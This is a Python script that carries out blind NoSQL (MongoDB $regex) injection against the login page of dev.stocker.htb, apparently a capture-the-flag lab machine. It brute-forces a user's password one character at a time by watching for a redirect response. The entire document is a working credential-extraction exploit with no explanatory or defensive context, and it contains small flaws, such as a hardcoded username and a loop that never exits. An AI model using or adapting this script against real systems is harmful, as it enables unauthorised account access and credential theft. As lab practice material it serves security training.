import requests
import string
import json

url = "http://dev.stocker.htb/login"
headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}

possible_chars = string.ascii_letters + string.digits + "}_{"

def getPassword(username):
    print("Extracting password of "+username)
    password = "^"
    data = {"username": {"$eq": "angoose"}, "password": {"$regex": password} }
    while True:
        for char in possible_chars:
            data["password"]["$regex"] = password + char + ".*"
            pr = requests.post(url, data=json.dumps(data), headers=headers, allow_redirects=False)
            if "Redirecting to /stock" in pr.text:
                password += char
                print(password)
                break
            if char == possible_chars[-1]:
                print("Found password "+password[1:]+" for username "+username)
                

getPassword("angoose")